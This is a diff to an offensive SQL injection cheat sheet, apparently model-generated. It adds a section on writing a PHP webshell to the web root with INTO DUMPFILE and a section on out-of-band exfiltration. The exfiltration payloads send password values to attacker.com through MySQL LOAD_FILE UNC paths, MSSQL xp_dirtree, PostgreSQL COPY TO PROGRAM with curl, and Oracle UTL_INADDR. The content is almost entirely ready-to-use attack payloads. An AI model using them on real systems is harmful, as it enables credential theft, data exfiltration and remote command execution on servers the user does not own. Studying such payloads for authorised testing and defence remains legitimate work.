@@ -198,8 +198,13 @@ SHOW DATABASES;
 -- Proof of write
 ' UNION SELECT NULL,'test',NULL INTO OUTFILE '/var/www/html/proof.txt'-- -
 
--- PHP webshell
+-- PHP webshell (text mode — adds trailing newline, fine for PHP)
 ' UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
+
+-- INTO DUMPFILE vs INTO OUTFILE:
+-- OUTFILE: text mode, adds newline after each row — breaks binary files
+-- DUMPFILE: binary mode, single row, no added chars — use for binary payloads
+' UNION SELECT NULL,0x3c3f706870...,NULL INTO DUMPFILE '/var/www/html/shell.php'-- -
 
 -- Then access: http://target.com/shell.php?0=id
 ```
@@ -304,6 +309,39 @@ Force DB to return data inside error messages:
 -- MSSQL (CONVERT/CAST)
 ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
 ```
+
+---
+
+## Out-of-Band (OOB) Exfil
+
+Used when there's no visible response and time-based is unreliable. Exfil data via DNS or HTTP callback.
+
+```sql
+-- MySQL — LOAD_FILE with UNC path triggers DNS lookup (Windows MySQL only)
+-- Data appears as subdomain in DNS query to your server
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\test'))-- -
+-- Use interactsh or Burp Collaborator to catch the DNS query
+
+-- MySQL — SELECT INTO OUTFILE to UNC path (Windows, SMB outbound allowed)
+' UNION SELECT NULL,user(),NULL INTO OUTFILE '\\\\attacker.com\\share\\out.txt'-- -
+
+-- MSSQL — xp_dirtree forces SMB/DNS callback
+'; EXEC master..xp_dirtree '\\attacker.com\test'-- -
+'; EXEC master..xp_dirtree CONCAT('\\\\', (SELECT TOP 1 password FROM users), '.attacker.com\\x')-- -
+
+-- MSSQL — xp_fileexist alternative
+'; EXEC xp_fileexist '\\attacker.com\test'-- -
+
+-- PostgreSQL — COPY to remote (if outbound connections allowed)
+'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://attacker.com/?d=$(cat)'-- -
+
+-- Oracle — UTL_HTTP (see Oracle section)
+-- Oracle — UTL_DNS_RESOLVE
+' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE rownum=1)||'.attacker.com'),NULL FROM dual-- -
+```
+
+> [!tip]
+> Use Burp Collaborator or `interactsh-client` to receive OOB callbacks. DNS callbacks work even through strict egress filters that block HTTP.
 
 ---
 
@@ -751,5 +789,5 @@ sqlmap -u "http://target.com/page?id=1" --sql-shell
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
